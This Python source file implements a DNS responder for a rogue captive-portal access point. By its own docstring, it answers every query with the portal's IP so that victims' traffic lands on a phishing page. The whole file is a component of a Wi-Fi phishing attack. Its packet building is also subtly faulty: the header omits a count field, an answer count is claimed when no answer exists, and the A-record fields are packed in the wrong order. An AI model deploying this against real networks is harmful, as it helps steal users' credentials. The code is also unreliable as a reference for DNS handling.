"""Userland DNS blackhole for the captive-portal AP.

Every DNS query is answered with the portal IP, redirecting all HTTP
traffic to the phishing page.  Operates over raw 802.11 data frames.
"""
from __future__ import annotations

import logging
import struct
from dataclasses import dataclass
from typing import Callable, Optional

log = logging.getLogger(__name__)

_PORT = 53


@dataclass
class DnsBlackhole:
    """Minimal DNS server that replies to every A query with *redirect_ip*.

    ``send_ip`` wraps the reply into an 802.11 data frame."""
    redirect_ip: str = "192.168.4.1"
    send_ip: Optional[Callable[[str, bytes], None]] = None  # (client_ip, udp_payload)

    def handle_dns(self, raw_udp: bytes, src_ip: str) -> Optional[bytes]:
        """Parse a DNS query and return a reply pointing to *redirect_ip*."""
        if len(raw_udp) < 12:
            return None

        tx_id = raw_udp[0:2]
        flags = struct.unpack(">H", raw_udp[2:4])[0]
        # Only respond to standard queries (opcode 0, QR=0)
        if flags & 0x8000:
            return None
        opcode = (flags >> 11) & 0x0F
        if opcode != 0:
            return None

        qdcount = struct.unpack(">H", raw_udp[4:6])[0]
        if qdcount < 1:
            return None

        # Parse the first question
        qname, end = self._parse_qname(raw_udp, 12)
        if end + 4 > len(raw_udp):
            return None
        qtype = struct.unpack(">H", raw_udp[end:end + 2])[0]
        qclass = struct.unpack(">H", raw_udp[end + 2:end + 4])[0]

        # Build reply header
        reply_flags = 0x8180  # QR=1, RD=1, RA=1, RCODE=0
        if qtype != 1:  # not an A record
            reply_flags = 0x8181  # RCODE=1 (format error) - just echo
        header = tx_id + struct.pack(">H", reply_flags)
        header += raw_udp[4:6]  # QDCOUNT (echo)
        header += struct.pack(">HH", 1, 0)  # ANCOUNT=1, NSCOUNT=0, ARCOUNT=0

        # Echo question
        question = raw_udp[12:end + 4]

        # Answer (if A query)
        answer = b""
        if qtype == 1 and qclass == 1:
            answer = self._build_a_answer(qname, self.redirect_ip)

        return header + question + answer

    @staticmethod
    def _parse_qname(data: bytes, offset: int) -> tuple[str, int]:
        labels = []
        i = offset
        while i < len(data):
            length = data[i]
            if length == 0:
                i += 1
                break
            if length >= 0xC0:
                # compression pointer - not expected in queries but handle
                ptr = ((length & 0x3F) << 8) | data[i + 1]
                i += 2
                _, ptr_end = DnsBlackhole._parse_qname(data, ptr)
                labels_str = ".".join(labels)
                return labels_str, i if not labels else ptr_end
            i += 1
            labels.append(data[i:i + length].decode("ascii", errors="replace"))
            i += length
        return ".".join(labels), i

    @staticmethod
    def _build_a_answer(qname: str, ip: str) -> bytes:
        """Build a DNS A-record answer (simple, no compression)."""
        # Encode qname
        name_bytes = b""
        for label in qname.split("."):
            name_bytes += bytes([len(label)]) + label.encode("ascii")
        name_bytes += b"\x00"

        ip_bytes = bytes(int(o) for o in ip.split("."))
        # Name(2) + Type(2) + Class(2) + TTL(4) + RDLEN(2) + RDATA(4)
        return name_bytes + struct.pack(">HHIH", 1, 1, 1, 300) + struct.pack(">H", 4) + ip_bytes
